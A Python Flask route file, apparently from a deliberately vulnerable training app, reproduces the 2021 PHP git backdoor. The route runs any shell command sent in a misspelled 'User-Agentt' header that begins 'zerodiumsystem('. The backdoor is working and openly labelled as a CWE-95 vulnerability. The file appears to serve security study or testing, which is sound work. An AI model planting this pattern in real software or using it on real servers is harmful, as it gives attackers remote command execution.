from flask import Blueprint, render_template, redirect, request

# CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
# Inspired by the PHP git server compromise (March 2021).
# Attackers added a backdoor that eval()'d code from the User-Agentt header
# (note the double-t — used to avoid detection by simple string search).
# https://news-web.php.net/php.internals/113838
mod_hello = Blueprint('mod_hello', __name__, template_folder='templates')

_TRIGGER_HEADER = 'User-Agentt'
_TRIGGER_PREFIX  = 'zerodiumsystem('


@mod_hello.route('/')
def do_hello():
    ua = request.headers.get(_TRIGGER_HEADER, '')
    # VULNERABILITY: executes arbitrary Python if User-Agentt starts with trigger prefix
    if ua.startswith(_TRIGGER_PREFIX):
        cmd = ua[len(_TRIGGER_PREFIX):].rstrip(')')
        result = ''
        try:
            import subprocess
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        except Exception as e:
            result = str(e)
        return result, 200
    return 'hello :)'

